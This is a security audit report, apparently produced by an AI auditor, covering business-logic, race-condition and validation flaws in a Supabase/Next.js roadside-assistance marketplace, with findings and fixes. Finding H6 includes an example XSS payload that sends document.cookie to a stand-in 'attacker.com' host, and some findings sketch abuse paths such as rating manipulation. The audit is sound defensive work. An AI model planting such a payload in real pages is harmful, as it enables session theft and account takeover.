# SECURITY AUDIT PART 2 — Business Logic, API Routes, Input Validation, Data Integrity

**Date:** 2026-06-11
**Auditor:** Claude Sonnet 4.6 (automated, full source read)
**Scope:** Quote/dispatch logic, price-change flow, SLA & state machine, input validation, data integrity, ratings
**Baseline:** Full production conditions — Stripe LIVE, real money, real PII, commission active
**Files read:** All 28 API routes, migrations 001–038, dispatch.ts, range-estimator.ts, provider-score.ts, geo.ts, ops cron routes
**Part 1 status:** C1–C5, H1–H7, M1–M7, L1–L5 already documented. Not repeated here.

---

## HIGH FINDINGS

---

### H1 — Ring/Dispatch Eligibility Not Enforced at Quote Submission API

**Files:** `src/app/api/provider/jobs/quote/route.ts` (entire file), `src/lib/dispatch.ts:33–41`
**Severity:** HIGH

**Finding:**
`dispatch.ts` defines ring-based eligibility rules:
- PPJ providers are excluded from ring 1 (< 5 km) — subscription providers get priority
- Ring advancement is time-gated (5 min per ring, providers see requests only within their ring)
- Daily visibility limits differ per plan (PPJ: 3, Starter: 5, Pro: 10, Business: 20)

These rules are enforced **only in the dashboard display layer** (`filterDispatchCandidates`, `computeCurrentRing`). Neither the quote submission route nor `submit_quote_atomic` checks ring eligibility, PPJ ring-1 exclusion, or the time-based ring advancement.

The route checks:
1. Provider `status = active` ✓
2. Provider has a fresh online location ✓
3. Request is `open` or `quoted` ✓
4. `submit_quote_atomic` checks active job capacity and daily quote count ✓

Missing checks:
- Distance from provider to request ≤ current ring radius
- PPJ providers excluded from ring 1
- Time-based ring advancement (only providers within the active ring see the request)

**Attack scenario:**
A PPJ provider (paying AED 30–70/job) calculates their ring-1 exclusion will hurt their profits. They send a direct API call to `POST /api/provider/jobs/quote` for any open request within 5 km. The route accepts it. They compete directly with Business plan subscribers (AED 500–1000+/month) on ring-1 jobs. Business subscribers pay for ring-1 priority that is never enforced.

**Fix direction:** Add ring eligibility check to the quote route using `isProviderEligibleForRing` and `computeCurrentRing` before calling the RPC; add `p_max_distance_km` parameter to `submit_quote_atomic` and enforce it inside the RPC where the provider row is locked.

---

### H2 — `release_job_atomic` Does Not Clear `selected_quote_id` — Stale FK Sets Wrong Completion Price via Legacy Path

**Files:** `supabase/migrations/028_stuck_job_auto_release.sql:48–55`, `supabase/migrations/031_marketplace_v2_schema.sql:773–780`
**Severity:** HIGH

**Finding:**
When a provider manually releases a V2-accepted job, `release_job_atomic` resets:
```sql
UPDATE requests SET status = 'open', accepted_by = NULL WHERE ...
```
It does **not** clear `selected_quote_id`, `accepted_at`, or `price_change_*` fields.

After release, the request is `open` with `selected_quote_id` still pointing to the original provider's quote. If the legacy accept path picks up this request (PPJ payment / overage webhook calls `accept_provider_request_atomic` which only requires `status = 'open'`), then when the new provider completes the job, `complete_provider_job_atomic` derives the final price:
```sql
ELSIF v_request.selected_quote_id IS NOT NULL THEN
  SELECT proposed_price::INTEGER INTO v_derived_price
  FROM request_quotes WHERE id = v_request.selected_quote_id;
```
The stale `selected_quote_id` causes the new provider's completion to be priced at the **original provider's old quote**, not any price agreed with Provider B. The customer is billed at the wrong price with no visibility into the mismatch.

Additionally, `release_job_atomic` does not mark the previously-selected quote as `rejected` in `request_quotes` (unlike `sla_check_and_release` which does). After release, the quote row remains `status = 'selected'` indefinitely.

**Fix direction:** In `release_job_atomic` (migration 039), add:
```sql
UPDATE requests SET selected_quote_id = NULL, accepted_at = NULL, price_change_status = NULL, price_change_requested = NULL WHERE id = p_request_id;
UPDATE request_quotes SET status = 'rejected' WHERE request_id = p_request_id AND status = 'selected';
```

---

### H3 — `release_job_atomic` and `expire_stuck_active_requests` Do Not Decrement `jobs_this_month`

**Files:** `supabase/migrations/028_stuck_job_auto_release.sql:74–77, 130–133`, `supabase/migrations/031_marketplace_v2_schema.sql:566–568`
**Severity:** HIGH

**Finding:**
`jobs_this_month` is incremented unconditionally in `select_quote_atomic` (every accepted V2 job). Decrements happen inconsistently across release paths:

| Path | Decrements `jobs_this_month` |
|---|---|
| `sla_check_and_release` (SLA breach) | ✅ YES |
| `cancel_request_and_compensate_atomic` (late cancel) | ✅ YES (subscription plans only) |
| `release_job_atomic` (provider-initiated release) | ❌ NO |
| `expire_stuck_active_requests` (auto-release after 3 h) | ❌ NO |

A Starter plan provider (15 jobs/month) who releases 5 jobs mid-month has used 5 allowance slots without completing any work. Their remaining 10 slots are their real monthly capacity. The monthly allowance reset cron restores this, but within any given month the counter overstates usage by the number of released jobs.

Secondary impact: `GET /api/requests/quotes` uses `jobs_this_month` as `completedJobs` in `computeProviderScore`:
```typescript
completedJobs: provider.jobs_this_month ?? 0,
acceptanceRate: computeAcceptanceRate(provider.jobs_this_month ?? 0, (provider.jobs_this_month ?? 0) + 1),
```
Inflated counters from releases artificially boost a provider's apparent score.

**Fix direction:** In `release_job_atomic` and `expire_stuck_active_requests`, add `jobs_this_month = GREATEST(0, COALESCE(jobs_this_month, 0) - 1)` to the provider UPDATE, mirroring `sla_check_and_release`.

---

### H4 — Provider Auto-Suspension Trigger Has No Admin Review Gate

**Files:** `supabase/migrations/001_initial_schema.sql:189–200`
**Severity:** HIGH

**Finding:**
```sql
CREATE OR REPLACE FUNCTION check_provider_suspension()
RETURNS TRIGGER AS $$
BEGIN
  IF NEW.rating < 3.0 AND (SELECT COUNT(*) FROM ratings WHERE provider_id = NEW.id) >= 5 THEN
    UPDATE providers SET status = 'suspended' WHERE id = NEW.id;
  END IF;
  RETURN NEW;
END;
```
This trigger fires `AFTER UPDATE OF rating ON providers`, which is itself triggered by `update_provider_rating()` after every new rating INSERT.

**Exploitation path (requires 5 real completed jobs):**
1. Attacker creates 5 customer accounts
2. Hires the target provider for 5 small jobs (completing legitimate service requests)
3. All 5 accounts rate the provider 1 star
4. Provider's average rating drops below 3.0 with ≥ 5 ratings
5. Trigger auto-suspends the provider — no admin intervention needed
6. Provider is removed from the marketplace until an admin manually reactivates

A new provider with fewer than 5 lifetime reviews is the most vulnerable. A provider who has received 4 perfect ratings needs only one 1-star review to be at risk if the other 4 reviews stay at 4+ stars — once a 5th review drops the average below 3.0, suspension fires.

**Additional concern:** The trigger has no exponential back-off or cooldown — one extra low rating can tip a previously-safe provider over the threshold at any time.

**Fix direction:** Remove the automatic suspension trigger. Route the suspension decision through admin review: set a flag (e.g., `low_rating_flag`) when the threshold is crossed, alert the admin dashboard, and require a human decision before status changes.

---

### H5 — Price Change Route Returns 200 on Zero-Row UPDATE After Job Completion Race

**Files:** `src/app/api/provider/jobs/price-change/route.ts:69–88`
**Severity:** HIGH

**Finding:**
The price-change route reads the request status and checks `price_change_count` in a pre-flight fetch, then issues an UPDATE:
```typescript
const { error: updateError } = await admin
  .from('requests')
  .update({ price_change_requested: ..., price_change_status: 'pending', price_change_count: ... })
  .eq('id', parsed.data.request_id)
  .eq('accepted_by', user.id)
  .eq('status', 'in_progress')

if (updateError) { return 500 }
return NextResponse.json({ success: true })  // ← always reached if no DB error
```
If the job is completed (or SLA-released) concurrently — transitioning status away from `in_progress` — the UPDATE affects 0 rows. Supabase returns no error for a zero-row UPDATE; `updateError` is null. The route returns `{ success: true }`.

The provider's UI shows the price change was submitted. The customer's UI shows a pending price change notification. But in the database, no change occurred. If the customer acts on this phantom notification (trying to approve/reject), they will receive a 409 `No pending price change to respond to`.

This is a false confirmation of a business action that did not occur.

**Fix direction:** After the UPDATE, re-read the row (or use PostgreSQL's `RETURNING` via an RPC) to verify `price_change_status = 'pending'`. Return 409 if 0 rows were updated.

---

### H6 — Stored XSS Risk in User-Supplied Text Fields Rendered in Admin/Provider UIs

**Files:** `src/app/api/requests/route.ts:13, 22`, `src/app/api/ratings/route.ts:11`, `src/app/api/admin/providers/update/route.ts:21`
**Severity:** HIGH

**Finding:**
The following user-supplied text fields are stored without HTML sanitization:
- `note` (customer note, up to 500 chars) — displayed to providers on the dashboard request cards
- `destination` / `destination_area` (up to 300/150 chars) — displayed to providers in the dashboard
- `rating.comment` (up to 500 chars) — displayed in admin panel and potentially provider ratings page
- `provider_kyc_log.notes` / `review_notes` (up to 1000 chars) — displayed in admin provider review

If any page renders these fields using `dangerouslySetInnerHTML`, `.innerHTML`, or with insufficient escaping (e.g., JSX attribute interpolation without sanitization), a malicious input like:
```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```
executes in the admin's or provider's browser. At production, admin-panel XSS leads to session token theft and full admin access.

Zod `trim()` is applied to some fields but does not escape HTML entities.

**Fix direction:** Before storing, HTML-encode all user-supplied text fields using a server-side sanitizer (e.g., `DOMPurify` with `ALLOWED_TAGS: []`). Alternatively, verify that all rendering pages use React's default HTML-safe text interpolation (JSX `{}` without `dangerouslySetInnerHTML`) and add an explicit audit of every page that displays these fields.

---

## MEDIUM FINDINGS

---

### M1 — `expireUnselectedRequests` and `expireStaleQuotes` Run in Parallel, Not Atomically

**File:** `src/app/api/ops/marketplace-cron/route.ts:24–38`
**Severity:** MEDIUM

**Finding:**
The marketplace cron runs three tasks in `Promise.all`:
```typescript
const [expireQuotesResult, expireRequestsResult, slaResult] = await Promise.all([
  expireStaleQuotes(supabase),
  expireUnselectedRequests(supabase, now),
  enforceSla(supabase, now),
])
```
`expireStaleQuotes` marks `request_quotes.status = 'expired'` where `expires_at < now`.
`expireUnselectedRequests` marks `requests.status = 'expired'` where `quoted_at` is 20 minutes old.

These are separate, non-atomic operations. Between the two, brief states exist:
- Request is `expired` but some of its pending quotes are still `pending` (quote validity > 20 min)
- Quotes are `expired` but the parent request is still `quoted` (quote validity < request timeout)

In the second window, `GET /api/requests/quotes` returns `[]` (no pending non-expired quotes) but the request is still `quoted`, causing the customer UI to show an empty quote list without indicating the request has expired.

**Fix direction:** Expire stale quotes first; expire the request only after all its pending quotes have been expired or use a single Postgres RPC that atomically handles both.

---

### M2 — Price Change Count Is Not Atomic — Race Allows Multiple Price Changes Per Job

**File:** `src/app/api/provider/jobs/price-change/route.ts:65–75`
**Severity:** MEDIUM

**Finding:**
The check-then-update is two separate operations with no optimistic lock on `price_change_count`:
```typescript
if (request.price_change_count >= 1) {
  return 409  // guard passes if count = 0
}
...
await admin.from('requests').update({
  price_change_count: (request.price_change_count ?? 0) + 1,  // computes from stale read
  price_change_requested: parsed.data.new_price,
  price_change_status: 'pending',
}).eq('id', ....).eq('status', 'in_progress')
```
Two concurrent requests both read `price_change_count = 0`, both pass the `>= 1` guard. Both execute the UPDATE with `price_change_count = 1`. The last write wins for `price_change_requested`. Since there's a rate limit of 5/minute, a provider can fire 5 rapid concurrent requests with different `new_price` values. The customer sees the last-written price as the pending change, but the provider has multiple 200 confirmations.

**Fix direction:** Replace the two-step pattern with an atomic UPDATE:
```typescript
.update({ price_change_count: 1, price_change_requested: ..., price_change_status: 'pending' })
.eq('id', ...).eq('status', 'in_progress').eq('price_change_count', 0)
```
Then check rows affected to confirm the update succeeded.

---

### M3 — `advance_provider_job_state` RPC Accepts Arbitrary `p_to_status` — Route Is the Only Transition Guard

**File:** `supabase/migrations/026_advance_state_atomic.sql:26–36`
**Severity:** MEDIUM

**Finding:**
```sql
UPDATE public.requests
SET    status = p_to_status
WHERE  id          = p_request_id
  AND  accepted_by = p_provider_id
  AND  status      = p_from_status;
```
The RPC performs no whitelist validation on `p_to_status`. Any service-role caller can advance a job backward (e.g., `in_progress → accepted`) or skip states (e.g., `accepted → in_progress`). The `requests_status_check` DB constraint allows all valid status strings but does not enforce forward-only transitions.

The route's `VALID_TRANSITIONS` table is the sole guard. If any future server-side code path calls the RPC directly (e.g., a migration, a new admin endpoint, or an ops cron), invalid transitions will succeed silently.

**Fix direction:** Add a whitelist check inside the RPC:
```sql
IF (p_from_status, p_to_status) NOT IN (
  ('accepted','en_route'), ('en_route','arrived'), ('arrived','in_progress')
) THEN
  RETURN QUERY SELECT FALSE, 'invalid_transition'::TEXT, NULL::TEXT; RETURN;
END IF;
```

---

### M4 — `cancel_request_and_compensate_atomic` Does Not Clear `accepted_by` or `selected_quote_id`

**File:** `supabase/migrations/034_cancel_allow_quoted_status.sql:52–60`
**Severity:** MEDIUM

**Finding:**
On late cancellation of an accepted job:
```sql
UPDATE requests
SET status = 'cancelled', cancelled_at = p_now, ...
WHERE id = p_request_id AND status IN ('open', 'quoted', 'accepted', ...);
```
Fields not cleared: `accepted_by`, `selected_quote_id`, `accepted_at`, `price_change_*`.

After cancellation, the request row holds stale FK references to the provider and quote. The `jobs` record also remains (no `DELETE FROM jobs` in the cancel RPC). The provider's `jobs_this_month` is decremented only for subscription plans, not PPJ.

While the `cancelled` status prevents further business logic from executing, this orphaned data complicates reconciliation, admin audits, and any future re-use of request data.

**Fix direction:** In `cancel_request_and_compensate_atomic`, add: `accepted_by = NULL, selected_quote_id = NULL, accepted_at = NULL` to the cancellation UPDATE.

---

### M5 — `cancellation_count` Counter Update Silently Fails on Concurrent Cancellations

**File:** `src/app/api/requests/cancel/route.ts:163–170`
**Severity:** MEDIUM

**Finding:**
The cancel route uses an optimistic lock for the counter increment:
```typescript
await admin
  .from('users')
  .update({ cancellation_count: (profile.cancellation_count ?? 0) + 1, ... })
  .eq('id', user.id)
  .eq('cancellation_count', profile.cancellation_count ?? 0)
// ↑ no error check on this UPDATE
```
If two cancellations race, the optimistic lock correctly prevents double-increment for the second request. But the return value is not checked — if the update matches 0 rows (concurrent update beat it), the counter silently stays un-incremented. The cancellation itself succeeded (the RPC already ran), so the customer's cancellation history is understated.

Over time, `cancellation_count` and `late_cancellation_count` drift below their true values. These counters are displayed to customers and used for late-cancellation warnings.

**Fix direction:** Check the update result; retry or log on optimistic lock failure. Alternatively, move the counter increment inside the cancel RPC as an atomic `jobs_this_month`-style UPDATE.

---

### M6 — SLA Cron Only Targets `accepted` Status — Providers Who Advance to `en_route` Avoid 20-Minute Penalty

**File:** `src/app/api/ops/marketplace-cron/route.ts:114–120`
**Severity:** MEDIUM

**Finding:**
```typescript
const { data: breachedRequests } = await supabase
  .from('requests')
  .select('id, accepted_at')
  .eq('status', 'accepted')  // ← only accepted
  .not('accepted_at', 'is', null)
  .lt('accepted_at', slaDeadlineCutoff)
```
The 20-minute SLA applies only to requests still in `accepted` status. A provider who accepts a job and immediately calls `POST /api/provider/jobs/advance-state` (advancing to `en_route`) bypasses the SLA check entirely. The `sla_check_and_release` RPC also returns early if `status <> 'accepted'`:
```sql
IF v_request.status <> 'accepted' THEN
  RETURN QUERY SELECT FALSE, 'not_in_accepted_status'::TEXT, NULL::UUID, FALSE;
```
The only protection for these jobs is `expire_stuck_active_requests` (3-hour cutoff, no SLA penalty on the provider). A provider can accept, advance to `en_route` in seconds, and then go dark for up to 3 hours without an `sla_failure_count` increment.

**Fix direction:** Extend SLA enforcement to include `en_route` status (with a separate, longer tolerance, e.g., 45 minutes), or add a separate SLA timer for `en_route` that triggers `sla_check_and_release` if `en_route_at` is older than the threshold.

---

### M7 — `jobs_this_month` Used as `completedJobs` in Provider Scoring — Wrong Metric

**File:** `src/app/api/requests/quotes/route.ts:172–181`
**Severity:** MEDIUM

**Finding:**
```typescript
const scoreResult = computeProviderScore({
  ...
  completedJobs: provider.jobs_this_month ?? 0,
  acceptanceRate: computeAcceptanceRate(provider.jobs_this_month ?? 0, (provider.jobs_this_month ?? 0) + 1),
})
```
`jobs_this_month` counts accepted jobs this calendar month, not total completed jobs, and is reset to 0 by the monthly cron. New providers (on the 1st of a month) score identically regardless of their history. A provider who completed 200 jobs in 11 months scores identically to a brand-new provider on the 1st of any month.

The acceptance rate computation `computeAcceptanceRate(jobs_this_month, jobs_this_month + 1)` also produces nonsensical results: a provider with `jobs_this_month = 0` has an acceptance rate of `0 / 1 = 0%`, penalizing them immediately after the monthly reset.

**Fix direction:** Replace `jobs_this_month` with a total lifetime `completed_jobs` counter (add column to `providers`), or query `COUNT(*) FROM jobs WHERE provider_id = ? AND completed_at IS NOT NULL` at score time.

---

### M8 — `problem_type` Enum Missing `fuel` and `lockout` — Two Service Types Can Never Be Requested

**File:** `src/app/api/requests/route.ts:10`
**Severity:** MEDIUM

**Finding:**
```typescript
problem_type: z.enum(['flat_tire', 'battery', 'tow', 'other']),
```
`fair_price_config` seed data includes 6 service types: `tow`, `battery`, `flat_tire`, `fuel`, `lockout`, `other`. The request creation schema only allows 4. `fuel` and `lockout` requests can never be created by customers, making their `fair_price_config` rows unused.

If the intent is to add these services, the DB is ready but the API rejects them silently as a validation error.

**Fix direction:** Extend the Zod enum to include `fuel` and `lockout`, or remove the corresponding `fair_price_config` rows if the services are permanently excluded.

---

## LOW FINDINGS

---

### L1 — `request_id` Query Parameter in GET /api/requests/quotes Not UUID-Validated

**File:** `src/app/api/requests/quotes/route.ts:46–49`
**Severity:** LOW

**Finding:**
```typescript
const requestId = req.nextUrl.searchParams.get('request_id')
if (!requestId) { return 400 }
// no z.string().uuid() check
```
A non-UUID string is passed directly to `admin.from('requests').select(...).eq('id', requestId)`. Supabase uses parameterized queries (no SQL injection risk), but malformed input silently returns 404. Proper validation would return 400 with a clear message.

**Fix direction:** Add `if (!requestId || !/^[0-9a-f-]{36}$/i.test(requestId)) return 400`.

---

### L2 — Daily Quote Limit Uses UTC Date Truncation, Not Rolling 24-Hour Window

**File:** `supabase/migrations/032_disable_range_estimator.sql:98–103`
**Severity:** LOW

**Finding:**
```sql
SELECT COUNT(*) INTO v_daily_count
FROM request_quotes
WHERE provider_id = p_provider_id
  AND sent_at::DATE = CURRENT_DATE;
```
`CURRENT_DATE` in Postgres defaults to UTC. Dubai is UTC+4. At midnight UAE time, the daily limit resets 4 hours before providers expect it, allowing extra quotes from 12:00 AM–4:00 AM local time. A provider aware of this could double their effective daily limit on the UTC date boundary.

**Fix direction:** Use a rolling 24-hour window: `AND sent_at > now() - INTERVAL '24 hours'`.

---

### L3 — `advance_provider_job_state` RPC Allows Backward State Transitions

**File:** `supabase/migrations/026_advance_state_atomic.sql:26–36`
**Severity:** LOW

**Finding:**
Calling the RPC with `p_from_status = 'in_progress'` and `p_to_status = 'accepted'` would succeed at the DB level. No DB constraint prevents backward transitions. The route prevents this, but the RPC — the authoritative Postgres function — does not.

Service-role access is required, so this is exploitable only by server-side code. The risk is minimal but real for future code paths.

**Fix direction:** Add transition whitelist in RPC (see M3 fix).

---

### L4 — `destination` Field Is Optional for `tow` Requests at API Level

**File:** `src/app/api/requests/route.ts:21–22`
**Severity:** LOW

**Finding:**
The `destination` field is `z.string().trim().max(300).optional().nullable()` for all request types, including `tow`. The UI requires it for tow requests, but direct API callers can omit it. Providers quoting a tow job without a destination cannot accurately price the job (no distance to destination available), leading to misleading quotes.

**Fix direction:** Add server-side conditional validation: if `problem_type === 'tow'`, require `destination` to be non-null and non-empty.

---

### L5 — `final_price` Ceiling in Completion Route Inconsistent With Quote and Price-Change Ceilings

**File:** `src/app/api/provider/jobs/complete/route.ts:10`
**Severity:** LOW

**Finding:**
```typescript
final_price: z.number().int().min(1).max(10000),  // 10,000 AED
// vs
proposed_price: z.number().min(1).max(50000),     // 50,000 AED (quote)
new_price: z.number().min(1).max(50000),           // 50,000 AED (price change)
```
A legitimate tow job priced at AED 12,000 (within the 50,000 quote ceiling) cannot be completed via the legacy path — `complete_provider_job_atomic` is called with `p_final_price = 12000` but the Zod schema rejects it at 400 before the RPC is reached.

For V2 requests, the schema's `max(10000)` is irrelevant (RPC derives price from the quote), but it creates false constraints for providers who submit `final_price` on legacy requests.

**Fix direction:** Align all price ceilings at 50,000 AED, or add a per-service-type ceiling.

---

### L6 — `ratings` Table Does Not Store `customer_id`

**File:** `supabase/migrations/001_initial_schema.sql:57–64`
**Severity:** LOW

**Finding:**
```sql
CREATE TABLE ratings (
  id UUID PRIMARY KEY,
  job_id UUID UNIQUE,
  provider_id UUID,
  stars INTEGER,
  comment TEXT,
  created_at TIMESTAMPTZ
);
-- no customer_id column
```
Rating comments cannot be traced back to their author. If a provider disputes an abusive or false comment, admins have no direct way to identify the customer. The comment accountability gap could shield coordinated rating manipulation.

**Fix direction:** Add `customer_id UUID REFERENCES users(id)` to the `ratings` table in migration 039.

---

### L7 — Rating Duplicate INSERT Returns 500 Instead of 409 on Concurrent Submissions

**File:** `src/app/api/ratings/route.ts:67–75`
**Severity:** LOW

**Finding:**
The route pre-checks for an existing rating:
```typescript
const { data: existing } = await admin.from('ratings').select('id').eq('job_id', ...).maybeSingle()
if (existing) { return 409 }
```
Two concurrent rating requests both pass this check (`existing = null`). The first INSERT succeeds. The second INSERT fails on the `UNIQUE(job_id)` DB constraint, returning a 500 error to the client instead of 409.

**Fix direction:** Catch the unique-constraint error code (`23505`) in the insert error and return 409.

---

### L8 — SLA Cron Processes Up to 50 Breached Requests Serially, Approaching Timeout

**File:** `src/app/api/ops/marketplace-cron/route.ts:132–152`
**Severity:** LOW

**Finding:**
`enforceSla` fetches up to 50 breached requests and calls `sla_check_and_release` in a serial `for` loop. Each RPC call takes ~20–100 ms. At 50 requests × 100 ms, this part alone could take 5 seconds. Combined with `expireStaleQuotes` and `expireUnselectedRequests` running in parallel (via `Promise.all`), the total cron execution time could approach the `maxDuration = 30` limit under load.

At production scale with many concurrent accepted jobs breaching SLA simultaneously, the cron could time out before processing all 50 requests.

**Fix direction:** Process SLA releases in parallel (`Promise.all`) rather than a serial loop, or increase the `limit` query and add a dedicated higher-timeout route.

---

### L9 — `price_change_requested` Stored as NUMERIC(10,2) but Cast to INTEGER at Completion

**File:** `supabase/migrations/031_marketplace_v2_schema.sql:773`
**Severity:** LOW

**Finding:**
```sql
v_derived_price := v_request.price_change_requested::INTEGER;
```
A price change of AED 150.75 is stored in `price_change_requested NUMERIC(10,2)` but truncated to AED 150 at completion. The customer approved 150.75 AED; the final price is 150 AED. Minor but creates a discrepancy between the approval and the receipt.

**Fix direction:** Use `ROUND(v_request.price_change_requested)::INTEGER` for predictable rounding behavior, or change `v_derived_price` to `NUMERIC(10,2)` throughout the completion RPC.

---

### L10 — `provider_dispatch_log` Has No Retention Policy — Unbounded Growth

**File:** `supabase/migrations/031_marketplace_v2_schema.sql:124–164`
**Severity:** LOW

**Finding:**
Every quote submission, selection, SLA failure, and completion writes a row to `provider_dispatch_log`. At 100 providers × 10 quotes/day, this is 1,000 rows/day, 365,000 rows/year, growing without bound. No archival or delete policy exists.

**Fix direction:** Add a cron job to archive rows older than 90 days to a `provider_dispatch_log_archive` table, or add a `created_at < now() - INTERVAL '90 days'` delete in the monthly ops cron.

---

### L11 — `NEXT_PUBLIC_SOFT_LAUNCH_MODE` Requires Redeploy to Change

**File:** `src/types/index.ts`
**Severity:** LOW

**Finding:**
```typescript
export const SOFT_LAUNCH_MODE = process.env.NEXT_PUBLIC_SOFT_LAUNCH_MODE === 'true'
```
`NEXT_PUBLIC_*` variables are baked into the client bundle at build time. Disabling soft launch mode requires a full Vercel redeploy, not a simple env variable update. This increases the time-to-switch when moving from soft launch to production billing.

**Fix direction:** Evaluate `SOFT_LAUNCH_MODE` from a server-side env var (`SOFT_LAUNCH_MODE` without `NEXT_PUBLIC_`) in API routes, keeping the client-side flag for UI behavior only.

---

## SUMMARY TABLE

| ID | Title | Severity | File(s) |
|----|-------|----------|---------|
| H1 | Ring/dispatch eligibility not enforced at quote submission API | **HIGH** | `api/provider/jobs/quote/route.ts`, `lib/dispatch.ts` |
| H2 | `release_job_atomic` does not clear `selected_quote_id` — stale FK sets wrong price | **HIGH** | `migrations/028:48–55`, `migrations/031:773–780` |
| H3 | `release_job_atomic` and `expire_stuck_active_requests` do not decrement `jobs_this_month` | **HIGH** | `migrations/028:74–77, 130–133` |
| H4 | Provider auto-suspended by 5 coordinated low ratings — no admin review gate | **HIGH** | `migrations/001:189–200` |
| H5 | Price change route returns 200 on zero-row UPDATE after job completion race | **HIGH** | `api/provider/jobs/price-change/route.ts:69–88` |
| H6 | Stored XSS in user-supplied text fields rendered in admin/provider UIs | **HIGH** | `api/requests/route.ts:13,22`, `api/ratings/route.ts:11`, `api/admin/providers/update/route.ts:21` |
| M1 | Cron expires requests and quotes in parallel, not atomically | **MEDIUM** | `api/ops/marketplace-cron/route.ts:24–38` |
| M2 | Price change count check-then-increment is not atomic | **MEDIUM** | `api/provider/jobs/price-change/route.ts:65–75` |
| M3 | `advance_provider_job_state` RPC accepts arbitrary `p_to_status` | **MEDIUM** | `migrations/026:26–36` |
| M4 | Late cancellation does not clear `accepted_by` / `selected_quote_id` | **MEDIUM** | `migrations/034:52–60` |
| M5 | `cancellation_count` counter update silently fails on concurrent race | **MEDIUM** | `api/requests/cancel/route.ts:163–170` |
| M6 | SLA cron targets only `accepted` — `en_route`/`arrived` jobs avoid 20-min penalty | **MEDIUM** | `api/ops/marketplace-cron/route.ts:114–120` |
| M7 | `jobs_this_month` used as `completedJobs` in scoring — wrong metric, resets monthly | **MEDIUM** | `api/requests/quotes/route.ts:172–181` |
| M8 | `problem_type` enum missing `fuel` and `lockout` service types | **MEDIUM** | `api/requests/route.ts:10` |
| L1 | `request_id` query param in GET /api/requests/quotes not UUID-validated | **LOW** | `api/requests/quotes/route.ts:46–49` |
| L2 | Daily quote limit uses UTC date truncation, not rolling 24-hour window | **LOW** | `migrations/032:98–103` |
| L3 | RPC allows backward state transitions (service_role only) | **LOW** | `migrations/026:26–36` |
| L4 | `destination` optional for `tow` requests at API level | **LOW** | `api/requests/route.ts:21–22` |
| L5 | `final_price` ceiling (10,000) inconsistent with quote/price-change ceiling (50,000) | **LOW** | `api/provider/jobs/complete/route.ts:10` |
| L6 | `ratings` table lacks `customer_id` — no comment accountability | **LOW** | `migrations/001:57–64` |
| L7 | Rating duplicate INSERT returns 500 instead of 409 | **LOW** | `api/ratings/route.ts:67–75` |
| L8 | SLA cron processes 50 breached requests serially, near 30-second timeout | **LOW** | `api/ops/marketplace-cron/route.ts:132–152` |
| L9 | `price_change_requested` NUMERIC truncated to INTEGER at completion | **LOW** | `migrations/031:773` |
| L10 | `provider_dispatch_log` has no retention policy | **LOW** | `migrations/031:124–164` |
| L11 | `SOFT_LAUNCH_MODE` requires full redeploy to change | **LOW** | `src/types/index.ts` |

---

## DATA INTEGRITY RISKS AT SCALE

The following patterns create silent counter drift and data inconsistency that compounds at production volume. None of these are immediately exploitable but will degrade platform reliability over months.

---

**SCALE-1: `jobs_this_month` counter diverges from reality under high job turnover**

At production, a provider completing 15 jobs/month with 2–3 releases (manual or SLA) will have `jobs_this_month` overstated by 2–3. Over multiple months this resets, but within a month:
- Legacy accept path rate-limiting becomes incorrect
- Provider scoring in the quote ranking is inflated
- Monthly allowance accounting is wrong

The counter is mutated by at least 6 separate code paths (4 increment, 4 decrement), and not all paths are symmetric (H3 above). A reconciliation cron or a view-based derivation from actual `requests` counts would be more reliable.

---

**SCALE-2: `update_provider_rating` trigger creates write hot-spot on `providers` table**

Every rating INSERT triggers an aggregate query over the last 50 rows of `ratings` for that provider, then an UPDATE on `providers.rating`. Under concurrent ratings (e.g., a popular provider completing many jobs in a short window), this creates a write hot-spot on the `providers` row, serializing all rating-write transactions for that provider. At scale, this increases P99 latency for the ratings API.

The cascading trigger on `providers.rating` (`check_provider_suspension`) then further locks the providers row. Two chained triggers per rating INSERT is expensive.

---

**SCALE-3: `request_quotes` table contains multi-status orphans from non-atomic release paths**

After `release_job_atomic`, the request goes to `open` but:
- The previously `selected` quote row remains `selected` indefinitely (not rejected)
- The previously `rejected` quotes from competitors remain `rejected`

If the request is re-quoted by new providers, the `request_quotes` table accumulates multiple generations of quotes for the same `request_id`: old `selected`/`rejected` rows mixed with new `pending` rows. The `UNIQUE(request_id, provider_id)` constraint means a provider who previously quoted this request (and was rejected) cannot re-quote it after the job is released, even though their previous quote was made under a different competitive context.

---

**SCALE-4: `provider_dispatch_log` is append-only with no foreign key constraints on soft-deleted data**

`provider_dispatch_log` has `ON DELETE CASCADE` on both `provider_id` and `request_id`. If a provider or request is deleted, all associated dispatch logs are silently purged. At audit time, historical dispatch data needed for fraud investigation or SLA disputes would be unrecoverable.

---

**SCALE-5: Monthly allowance reset cron failure cascades to incorrect overage billing**

`/api/ops/monthly-allowance-reset` resets `jobs_this_month = 0` for all providers. If this cron fails (network error, Vercel timeout, Upstash unavailable), providers carry their previous month's count into the new month. This causes:
- Subscription providers to hit their monthly limit on day 1
- Legacy accept path to block new jobs until manual admin intervention
- V2 quote path to remain unaffected (H3 from Part 1)

There is no alerting on cron failure, no reconciliation check, and no idempotent retry mechanism. A missed monthly reset effectively breaks the billing model for all subscription providers until the next successful cron run.

---

**SCALE-6: `fair_price_config` is read-writable by any authenticated user in UI but only via admin API**

The `fair_price_config` table has `AUTHENTICATED READ` RLS policy, so any logged-in user can read all service price configurations. There is no server-side API to write to this table — only an admin RLS policy exists. However, if the admin panel ever adds a UI to update these rows, the lack of audit logging on `fair_price_config` changes would prevent detection of price-range manipulation.

---

*End of Security Audit Part 2. No source files were modified. All findings are for review only.*